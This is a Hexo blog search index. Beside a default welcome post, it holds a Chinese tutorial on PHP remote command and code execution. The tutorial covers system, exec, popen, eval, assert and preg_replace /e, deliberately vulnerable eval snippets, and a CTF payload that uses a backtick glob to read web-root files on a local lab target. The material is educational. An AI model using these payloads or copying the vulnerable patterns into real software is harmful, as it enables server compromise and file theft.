<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>hello world</title>
    <url>/:/blog/hello-world-1.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/:/blog/hello-world.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>RCE</title>
    <url>/:/blog/RCE.html</url>
    <content><![CDATA[<h1 id="RCE漏洞原理"><a href="#RCE漏洞原理" class="headerlink" title="RCE漏洞原理"></a><center>RCE漏洞原理<center></h1><h5 id="英文全称：remote-command-code-execute-远程命令-代码执行漏洞-；"><a href="#英文全称：remote-command-code-execute-远程命令-代码执行漏洞-；" class="headerlink" title="英文全称：remote command/code execute(远程命令/代码执行漏洞)；"></a>英文全称：remote command/code execute(远程命令/代码执行漏洞)；</h5><h3 id="RCE分为远程命令执行和远程代码执行"><a href="#RCE分为远程命令执行和远程代码执行" class="headerlink" title="RCE分为远程命令执行和远程代码执行"></a>RCE分为<font color = red>远程命令执行</font>和<font color = red>远程代码执行</font></h3><p>区别：   </p>
<ul>
<li>能够对一个php的站点，控制php代码，那么我们就把它划分为代码执行      </li>
<li>如果能执行网站所在服务器中的命令，我们这就把它划分为命令执行，因为它执行的是系统命令</li>
</ul>
<h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a><font color = gree>远程命令执行</font></h2><h4 id="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"><a href="#命令执行漏洞指的是可以执行系统或者应用指令的漏洞" class="headerlink" title="命令执行漏洞指的是可以执行系统或者应用指令的漏洞"></a>命令执行漏洞指的是可以执行系统或者应用指令的漏洞</h4><p>如CMD命令或者bash命令的漏洞，PHP的命令执行漏洞主要基于一些函数的参数过滤不严导致，可以执行命令的函数有:<br><font color =red >system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open(),ob_start()，mail函数+LD_PRELOAD </font><br>执行系统命令共九个函数,另外反引号(`)也可以执行命令,不过实际上这种方式也是调用的shell_exec()函数。</p>
<h2 id="讲解函数"><a href="#讲解函数" class="headerlink" title="讲解函数"></a><font color = gree>讲解函数</font></h2><p>php提供了system(),exec(),passthru()这几个函数来调用外部的命令.    </p>
<p><font color = red>他们的区别 :</font>   </p>
<ul>
<li>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，第三个参数用来取得命令执行的状态码，通常执行成功都是返回０。  </li>
<li>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</li>
<li>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。   </li>
</ul>
<p><font color = red>相同点:</font>  </p>
<ul>
<li>都可以获得命令执行的状态码  <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Linux下一条命令或一个进程执行完成会返回一个一个状态码。</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>   ===   成功执行</span><br><span class="line"></span><br><span class="line">非<span class="number">0</span> ===  执行过程中出现异常或非正常退出</span><br></pre></td></tr></table></figure>
在PHP中调用外部命令，可以用如下三种方法来实现：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"system('whoami'):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">system(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"var_dump(exec('ipconfig')):   "</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump(exec(<span class="string">'ipconfig'</span>));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'exec(whoami,$b):'</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>,$b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">var_dump($b);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"exec('whoami')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">exec(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"passthru('whoami'):"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php">passthru(<span class="string">'whoami'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"shell_exec('ipconfig')"</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="popen-函数"><a href="#popen-函数" class="headerlink" title="popen()函数"></a><font color = red>popen()函数</font></h3>popen()丶proc_open()函数不会直接返回执行结果，而是返回一个文件指针，但命令是已经执行了的，下面我们看看 popen()的用法,它需要两个参数,一个是执行的命令,另<br>外一个是指针文件的连接模式，有r 和 w代表读和写。<br>测试代码如下：<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">windows下</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">popen(<span class="string">'dir &gt;&gt;E:/2.txt'</span>,<span class="string">'w'</span>)</span></span><br><span class="line"><span class="php"><span class="comment">//把标准输出重定向到一个文件中(追加)</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">linux下：</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = popen(<span class="string">"/bin/ls"</span>,<span class="string">"r"</span>);</span></span><br><span class="line"><span class="php"><span class="comment">//some code to be executed</span></span></span><br><span class="line"><span class="php">pclose($file);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<h2 id="CTF例题："><a href="#CTF例题：" class="headerlink" title="CTF例题："></a><font color = gree>CTF例题：</font></h2></li>
<li>DVWA靶场命令执行题<br><a href="http://127.0.0.1:8000/DVWA/vulnerabilities/exec/" target="_blank" rel="noopener">http://127.0.0.1:8000/DVWA/vulnerabilities/exec/</a></li>
</ul>
<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a><font color = gree>远程代码执行</font></h2><p>代码执行漏洞是指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行.说得好理解一点类似于SQL注人漏洞,可以把SQL语句注入到SQL服务执行，而PHP代码执行漏洞则是可以把代码注入<br>到应用中，最终到Webserver去执行。   </p>
<p>这样的漏洞如果没有特殊的过滤，相当于直接有一个Web后门存在，该漏洞主要由<font color = red>eval()、assert()、preg_replace()、call_user_func()call_user_func_array()、array_map()</font>等函数的参数过滤不严格导致     </p>
<p>另外还有PHP的动态函数（$a($b))也是目前出现比较多的。</p>
<h2 id="讲解函数-1"><a href="#讲解函数-1" class="headerlink" title="讲解函数"></a><font color = gree>讲解函数</font></h2><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a><font color = red>eval()函数</font></h3><p>eval() 函数把字符串按照 PHP 代码来计算。<br>该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>如果代码中存在解析错误，则 eval() 函数返回 false。   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$a = <span class="string">'aaa'</span>;</span></span><br><span class="line"><span class="php">$b = <span class="string">'bbb'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'$a=$b;'</span>);</span></span><br><span class="line"><span class="php">var_dump($a);</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo 1111;'</span>);</span></span><br></pre></td></tr></table></figure>
<p>代码不能包含打开/关闭PHP标签，但可以用合适的 PHP tag 来闭合离开、重新进入 PHP 模式。   </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'&lt;?php echo "Hi!"; ?&gt;'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">eval</span>(<span class="string">'echo "In PHP mode!"; ?&gt;In HTML mode!&lt;?php echo "Hi!";'</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>闭合php文件开头的<span class="php"><span class="meta">&lt;?php</span>，<span class="meta">&lt;?</span>=可以输出。</span></span><br><span class="line"><span class="php">另外这里<span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>是短标签，<span class="php"><span class="meta">&lt;?php</span> <span class="meta">?&gt;</span></span>是长标签。在php的配置文件php.ini中有一个short_open_tag的值，开启以后可以使用PHP的短标签：<span class="php"><span class="meta">&lt;?</span> <span class="meta">?&gt;</span></span>同时，</span><br><span class="line">只有开启这个才可以使用 <span class="php"><span class="meta">&lt;?</span>= 以代替 <span class="meta">&lt;?</span> <span class="keyword">echo</span>。不过在php7中这个标签被移除了。</span></span><br><span class="line"><span class="php">~~~ </span></span><br><span class="line"><span class="php"><span class="comment">### &lt;font color = red&gt;assert()函数&lt;/font&gt;  </span></span></span><br><span class="line"><span class="php">bool assert ( mixed $assertion [, string $description ] )    </span></span><br><span class="line"><span class="php">在PHP语言中是用来判断一个表达式是否成立，返回<span class="keyword">true</span> <span class="keyword">or</span> <span class="keyword">false</span>。    </span></span><br><span class="line"><span class="php">如果assertion 是字符串，它将会被assert（）当做PHP代码来执行。</span></span><br></pre></td></tr></table></figure>
<?php
$s = 123;
var_dump(assert("is_int($s)"));
?>

<?php
function fo(){
  $fp = fopen("E://2.txt",'w');
  fwrite($fp,"123");
  fclose($fp);
  return true;
}
var_dump(assert("fo()"));
?>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">函数原理：https:<span class="comment">//www.jianshu.com/p/6f7cc896ba2a</span></span><br><span class="line">### &lt;font color = red&gt;preg_replace()函数&lt;/font&gt; </span><br><span class="line">preg_replace 函数的作用是对字符串进行正则处理，执行一个正则表达式的搜索和替换,它经常会出现漏洞的位置，下面我们来看看它在什么情况下才会出现代码执行漏洞。这个函数比较早，<span class="number">5.5</span>中它已经被弃用了，但是你一样可以去使用它，但是在<span class="number">7.0</span>之后，你就没办法去调用。    </span><br><span class="line"></span><br><span class="line">它的参数和返回如下：   </span><br><span class="line"></span><br><span class="line">&lt;font color = blue&gt;mixed preg_replace ( mixed <span class="symbol">$</span>pattern , mixed <span class="symbol">$</span>replacement , mixed <span class="symbol">$</span>subject [, int <span class="symbol">$</span>limit = <span class="number">-1</span> [, int &amp;<span class="symbol">$</span>count ]] )&lt;/font&gt;    </span><br><span class="line"></span><br><span class="line">搜索 subject 中匹配 pattern 的部分，以 replacement 进行替换。   </span><br><span class="line">参数说明：   </span><br><span class="line"><span class="meta"><span class="meta-keyword">$pattern</span>: 要搜索的模式，可以是字符串或一个字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$replacement</span>: 用于替换的字符串或字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$subject</span>: 要搜索替换的目标字符串或字符串数组。   </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$limit</span>: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。    </span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$count</span>: 可选，为替换执行的次数。</span></span><br></pre></td></tr></table></figure>
<?php
@preg_replace("/\[(.*)\]/e",'\\1',$_GET['str']);
//preg_replace函数需要使用/e修饰符执行正则。
?>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">正则的意思是GET传递的str变量里搜索中括号口中间的内容作为第一组结果， preg_replace（）函数</span><br><span class="line">第二个参数为 '\\\<span class="number">1</span>'代表这里用第一组结果填充，这里是可以直接执行代码的，所以当我们请求 /<span class="number">1</span>.php?str=[phpinfo()]时，则执行代码&lt;font color = red&gt;phpinfo()&lt;/font&gt;      </span><br><span class="line">这个函数比较复杂，感兴趣的可以去这个博客看看   </span><br><span class="line"></span><br><span class="line">https://mochazz.github.io/<span class="number">2018</span>/<span class="number">08</span>/<span class="number">13</span>/<span class="symbol">%E6</span><span class="symbol">%B7</span><span class="symbol">%B1</span><span class="symbol">%E5</span><span class="symbol">%85</span><span class="symbol">%A5</span><span class="symbol">%E7</span><span class="symbol">%A0</span><span class="symbol">%94</span><span class="symbol">%E7</span><span class="symbol">%A9</span><span class="symbol">%B6preg_replace</span><span class="symbol">%E4</span><span class="symbol">%B8</span><span class="symbol">%8</span>E<span class="symbol">%E4</span><span class="symbol">%BB</span><span class="symbol">%A3</span><span class="symbol">%E7</span><span class="symbol">%A0</span><span class="symbol">%81</span><span class="symbol">%E6</span><span class="symbol">%89</span><span class="symbol">%A7</span><span class="symbol">%E8</span><span class="symbol">%A1</span><span class="symbol">%8</span>C/#<span class="symbol">%E6</span><span class="symbol">%A1</span><span class="symbol">%88</span><span class="symbol">%E4</span><span class="symbol">%BE</span><span class="symbol">%8</span>B</span><br><span class="line"></span><br><span class="line">### &lt;font color = red&gt;eval()函数例题：&lt;/font&gt;</span><br><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8000</span>/anhengweb<span class="number">2</span>.php</span><br></pre></td></tr></table></figure>
<?php
include 'flag.php';
if(isset($_GET['code'])){
    $code = $_GET['code'];
    if(strlen($code)>35){
        die("Long.");
    }
    if(preg_match("/[A-Za-z0-9_$]+/",$code)){
        die("NO.");
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  "php function getFlag() to get flag";
?>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">/bin/cat 执行命令    </span><br><span class="line"><span class="string">``</span>反单引号执行命令</span><br></pre></td></tr></table></figure>
<p>?&gt;<?=`/???/???%20/???/???/????/*`?><br>“/bin/cat /var/www/html/*”</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span> = <span class="string">red</span>&gt;</span>无字母数字preg_match绕过<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><a href="https://www.cnblogs.com/v01cano/p/11736722.html" target="_blank" rel="noopener">https://www.cnblogs.com/v01cano/p/11736722.html</a></p>
<pre><code></code></pre>]]></content>
      <categories>
        <category>远程代码/命令执行</category>
      </categories>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
</search>
